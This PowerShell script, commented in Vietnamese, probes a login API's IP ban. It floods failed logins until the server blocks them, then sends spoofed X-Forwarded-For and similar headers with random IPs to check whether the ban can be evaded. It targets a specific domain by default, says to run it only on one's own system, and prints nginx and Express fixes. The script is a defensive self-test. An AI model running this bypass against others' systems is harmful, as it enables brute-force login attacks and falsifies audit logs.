param (
    [string]$BaseUrl = "https://mice.3nestinvest.com/api/v1",
    [int]$MaxAttempts = 300,
    [int]$DelayMs = 0,
    [string]$EmailDomain = "probe.example.com"
)

# ==================================================================
#  PROBE: IP ban co bi bypass bang header khong?
#
#  Phase 1: ban may request cho toi khi bi 403/429 -> do nguong ban
#  Phase 2: doi header gia (XFF / CF / Forwarded) -> neu response
#           quay lai 401 thi rate-limit dang key theo header do
#           client tu gui  => LO HONG (bypass + gia mao log/audit)
#
#  Script nay co tinh lam ban IP cua ban. Chi chay tren he thong
#  cua ban.
# ==================================================================

$ErrorActionPreference = 'Stop'

function New-RandomIp {
    do {
        $a = Get-Random -Minimum 1 -Maximum 224
    } while ($a -eq 10 -or $a -eq 127 -or $a -eq 172 -or $a -eq 192 -or $a -eq 169)
    return "$a.$(Get-Random -Minimum 0 -Maximum 256).$(Get-Random -Minimum 0 -Maximum 256).$(Get-Random -Minimum 1 -Maximum 255)"
}

function Invoke-Login {
    param([hashtable]$Headers = @{})

    $email = "probe-$([guid]::NewGuid().ToString('N').Substring(0,12))@$EmailDomain"
    $body = "{`"email`":`"$email`",`"password`":`"WrongPass123!`"}"

    $args = @('-sS', '-o', 'NUL', '-w', '%{http_code}', '-m', '15',
              '-X', 'POST', '-H', 'Content-Type: application/json')
    foreach ($k in $Headers.Keys) { $args += @('-H', "$k`: $($Headers[$k])") }
    $args += "$BaseUrl/auth/login"

    $code = & curl.exe @args
    return [int]$code
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  BAN-BYPASS PROBE" -ForegroundColor Cyan
Write-Host "  Target: $BaseUrl/auth/login" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# ---------- Phase 1 ----------
Write-Host "`n[1] Do nguong ban (toi da $MaxAttempts request)..." -ForegroundColor Yellow

$banned = $false
$banAt = 0
$banStatus = 0

for ($i = 1; $i -le $MaxAttempts; $i++) {
    $code = Invoke-Login
    if ($code -eq 403 -or $code -eq 429) {
        $banned = $true
        $banAt = $i
        $banStatus = $code
        break
    }
    if ($DelayMs -gt 0) { Start-Sleep -Milliseconds $DelayMs }
}

if (-not $banned) {
    Write-Host "    -> Khong bi chan sau $MaxAttempts request (status cuoi: $code)." -ForegroundColor Green
    Write-Host "    -> Khong the ket luan bypass. Tang -MaxAttempts hoac kiem tra lai cau hinh ban." -ForegroundColor DarkGray
    exit 0
}

Write-Host "    -> Bi chan sau $banAt request (status $banStatus)" -ForegroundColor Red

# ---------- Phase 2 ----------
Write-Host "`n[2] Thu bypass bang header gia..." -ForegroundColor Yellow
Write-Host "    (moi dong: 3 request voi 3 IP gia khac nhau)`n" -ForegroundColor DarkGray

$strategies = @(
    @{ Name = 'X-Forwarded-For';  Key = 'X-Forwarded-For' },
    @{ Name = 'X-Real-IP';        Key = 'X-Real-IP' },
    @{ Name = 'CF-Connecting-IP'; Key = 'CF-Connecting-IP' },
    @{ Name = 'True-Client-IP';   Key = 'True-Client-IP' },
    @{ Name = 'Forwarded';        Key = 'Forwarded' }
)

$bypassed = @()

# Control: khong header
$control = Invoke-Login
Write-Host ("    {0,-18} {1}" -f 'CONTROL (khong)', $control)

foreach ($s in $strategies) {
    $codes = @()
    for ($j = 1; $j -le 3; $j++) {
        $ip = New-RandomIp
        $val = if ($s.Key -eq 'Forwarded') { "for=$ip" } else { $ip }
        $codes += Invoke-Login -Headers @{ $s.Key = $val }
    }
    $line = ($codes -join ', ')
    Write-Host ("    {0,-18} {1}" -f $s.Name, $line)

    if ($codes -contains 401 -or $codes -contains 400) {
        $bypassed += $s.Name
    }
}

# ---------- Ket luan ----------
Write-Host "`n==========================================================" -ForegroundColor Cyan

if ($bypassed.Count -gt 0) {
    Write-Host "  KET LUAN: CO LO HONG" -ForegroundColor Red
    Write-Host "  Rate limit / IP ban dang key theo header do client tu gui:" -ForegroundColor Red
    Write-Host "    $($bypassed -join ', ')" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Tac dong:" -ForegroundColor Yellow
    Write-Host "    - Bypass rate limit hoan toan (chi can doi header moi request)"
    Write-Host "    - Gia mao IP trong log/audit -> khong truy vet duoc"
    Write-Host "    - Neu login cung key theo header nay: brute-force khong bi chan"
    Write-Host ""
    Write-Host "  Cach va:" -ForegroundColor Yellow
    Write-Host "    - nginx: CHI set real_ip_header khi request den tu proxy tin cay"
    Write-Host "      (set_real_ip_from <IP cua LB>), khong dung `$http_x_forwarded_for` truc tiep."
    Write-Host "    - Express: app.set('trust proxy', <IP/range cua LB>), khong de true."
    Write-Host "    - Rate limit: key theo `$binary_remote_addr` (IP that), khong theo XFF."
} else {
    Write-Host "  KET LUAN: KHONG bypass duoc" -ForegroundColor Green
    Write-Host "  Header gia bi bo qua, ban van ap dung -> cau hinh dang dung." -ForegroundColor Green
    Write-Host ""
    Write-Host "  Luu y: ban co the la theo thoi gian. Doi 1-2 phut roi chay lai" -ForegroundColor DarkGray
    Write-Host "  de kiem tra ban co tu het khong (neu khong tu het = ban vinh vien)." -ForegroundColor DarkGray
}

Write-Host "==========================================================" -ForegroundColor Cyan
